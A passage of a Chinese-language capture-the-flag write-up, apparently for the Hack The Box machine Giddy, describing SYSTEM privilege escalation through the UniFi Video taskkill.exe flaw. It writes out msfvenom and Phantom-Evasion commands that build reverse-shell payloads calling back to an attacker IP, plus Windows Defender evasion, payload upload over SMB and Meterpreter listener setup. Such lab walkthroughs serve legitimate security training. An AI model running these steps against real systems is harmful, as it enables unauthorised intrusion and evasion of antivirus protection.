+<p>但是执行后发现如下错误</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`require&#x27;:</span> <span class="string">cannot</span> <span class="string">load</span> <span class="string">such</span> <span class="string">file</span> <span class="string">--</span> <span class="string">winrm</span> <span class="string">(LoadError)</span></span><br></pre></td></tr></table></figure>
+
+<p>可通过以下命令安装 winrm</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install winrm</span><br></pre></td></tr></table></figure>
+<p>安装完成后再次执行命令可成功获取权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.48.17.png" alt="截屏2021-11-11 上午1.48.17"><br>在当前用户桌面上寻找flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\\Users\stacy\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\\Users\stacy\Desktop\user.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.52.58.png" alt="截屏2021-11-11 上午1.52.58"><br>成功拿到第一个flag</p>
+<h2 id="0x03-权限提升-system"><a href="#0x03-权限提升-system" class="headerlink" title="0x03 权限提升[system]"></a>0x03 权限提升[system]</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在当前用户的<code>/Documents</code>目录下发现文件<code>unifivideo</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.56.34.png" alt="截屏2021-11-11 上午1.56.34"></p>
+<p>在谷歌中搜索 unifivideo 的相关漏洞<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%882.01.57.png" alt="截屏2021-11-11 上午2.01.57"></p>
+<h3 id="unifivideo提权漏洞"><a href="#unifivideo提权漏洞" class="headerlink" title="unifivideo提权漏洞"></a>unifivideo提权漏洞</h3><p>存在 unifivideo 服务漏洞（CVE-2016-6914）可用于权限提升，我们只需要将 payload 写入<code>\programdata\unifi-video\taskkill.exe</code>中，然后停止服务。在服务启动或停止时，它会加载并执行位于<code>C:\\ProgramData\unifi-video\taskkill.exe</code>文件，但是默认情况下该文件不在该目录下。普通用户可通过将任意<code>taskkill.exe</code>复制到<code>C:\\ProgramData\unifi-video\</code>目录下即可提升权限执行任意代码。</p>
+<h3 id="寻找unifivideo服务"><a href="#寻找unifivideo服务" class="headerlink" title="寻找unifivideo服务"></a>寻找unifivideo服务</h3><p>进入注册表配置单元寻找服务信息，成功发现<code>unifivideo</code>服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> HKLM:\system\currentcontrolset\services</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%882.37.54.png" alt="截屏2021-11-11 上午2.37.54"></p>
+<p>还存在另一种寻找服务的方法就是使用 PSReadLine，它默认将历史记录信息保存到 Powershell v5 的文件中，可以从中看到用户执行了哪些命令，首先获取它的大小</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Get-PSReadLineOption).MaximumHistoryCount</span><br></pre></td></tr></table></figure>
+<p>获取文件路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Get-PSReadLineOption).HistorySavePath</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%883.18.43.png" alt="截屏2021-11-11 上午3.18.43"></p>
+<p>但是无法直接获取其中的信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%883.21.29.png" alt="截屏2021-11-11 上午3.21.29"><br>进入该目录进行查看，其中包含启动和停止该服务的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> \Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\</span><br><span class="line">ls </span><br><span class="line"><span class="built_in">type</span> ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%883.30.55.png" alt="截屏2021-11-11 上午3.30.55"></p>
+<h3 id="Windows-Defender限制"><a href="#Windows-Defender限制" class="headerlink" title="Windows Defender限制"></a>Windows Defender限制</h3><p>通过 ps 命令查看当前进程发现<code>MsMpEng</code>之类的进程<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%883.35.29.png" alt="截屏2021-11-11 上午3.35.29"><br>说明目标已开启<code>Windows Defender</code>，需要进行绕过</p>
+<h3 id="Windows-Defender绕过"><a href="#Windows-Defender绕过" class="headerlink" title="Windows Defender绕过"></a>Windows Defender绕过</h3><h4 id="Ebowla"><a href="#Ebowla" class="headerlink" title="Ebowla"></a>Ebowla</h4><p>可使用 ebowla.py 来通过 ebowla 编码生成免杀木马<br><em><strong>工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a></strong></em></p>
+<p>首先使用 msfvenom 生成反弹shell的应用程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.17 lport=443 -f exe -o mac.exe </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%882.20.27.png" alt="截屏2021-11-11 上午2.20.27"></p>
+<p>在 ebowla 中设置 geneitc.config 的 ENV_VAR 配置参数</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">output_type</span> <span class="string">=</span> <span class="string">GO</span></span><br><span class="line"><span class="string">payload_type</span> <span class="string">=</span> <span class="string">EXE</span></span><br><span class="line"><span class="string">computername</span> <span class="string">=</span> <span class="string">&#x27;Giddy&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%883.48.42.png" alt="截屏2021-11-11 上午3.48.42"></p>
+<p>执行脚本生成编码后的程序文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ebowla.py mac.exe genetic.config</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%884.05.44.png" alt="截屏2021-11-11 上午4.05.44"><br>通过脚本对生成文件进行编译，但是这里go语言编译出了点问题</p>
+<h4 id="Phantom-Evasion"><a href="#Phantom-Evasion" class="headerlink" title="Phantom-Evasion"></a>Phantom-Evasion</h4><p>还有一种可以生成防病毒逃避工具<code>Phantom-Evasion</code></p>
+<p><em><strong>工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/oddcod3/Phantom-Evasion">https://github.com/oddcod3/Phantom-Evasion</a></strong></em></p>
+<p>首先安装 phantom-evasion</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 phantom-evasion.py --setup</span><br></pre></td></tr></table></figure>
+<p>如果其中有一些包无法安装，可通过以下命令进行更新</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
+<p>执行以下命令用于生成反弹shell木马程序<code>taskkill.exe</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 phantom-evasion.py -m WSI -msfp windows/meterpreter/reverse_tcp -H 10.10.14.17 -P 4444 -i Thread -e 4 -mem Virtual_RWX -j 1 -J 15 -jr 0 -E 5 -c www.windows.com:443 -f exe -o taskkill.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%889.43.55.png" alt="截屏2021-11-11 上午9.43.55"><br>成功生成<code>taskkill.exe</code>，在本地开启 smb 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py mac ~/hackthebox/Machines/Giddy </span><br></pre></td></tr></table></figure>
+<p>通过 smb 服务将<code>taskkill.exe</code>复制到<code>C:\\ProgramData\unifi-video\</code>下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\10.10.14.17\mac\taskkill.exe C:\\ProgramData\unifi-video\</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8810.27.22.png" alt="截屏2021-11-11 上午10.27.22"><br>成功上传后在本地开启 msf 监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; <span class="built_in">set</span> lhost 10.10.14.17</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8811.06.02.png" alt="截屏2021-11-11 上午11.06.02"><br>重启服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Stop-Service <span class="string">&quot;Ubiquiti UniFi Video&quot;</span></span><br><span class="line">Start-Service <span class="string">&quot;Ubiquiti UniFi Video&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8810.51.03.png" alt="截屏2021-11-11 上午10.51.03"></p>
+<p>成功收到反弹shell，权限为 system<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8811.08.12.png" alt="截屏2021-11-11 上午11.08.12"></p>
+<p>在管理员桌面上寻找第二个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\Administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8811.10.33.png" alt="截屏2021-11-11 上午11.10.33"><br>成功拿到第二个flag</p>
+<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>在 MSF 中存在一个 Windows Defender 绕过生成exe的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; evasion/windows/windows_defender_exe</span><br><span class="line">msf &gt; <span class="built_in">set</span> lhost 10.10.14.17</span><br><span class="line">msf &gt; run </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8811.31.42.png" alt="截屏2021-11-11 上午11.31.42"><br>将该木马上传后并执行，同样也获得系统权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8B%E5%8D%883.06.41.png" alt="截屏2021-11-11 下午3.06.41"></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/effdee49/">HTB: Secnotes<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
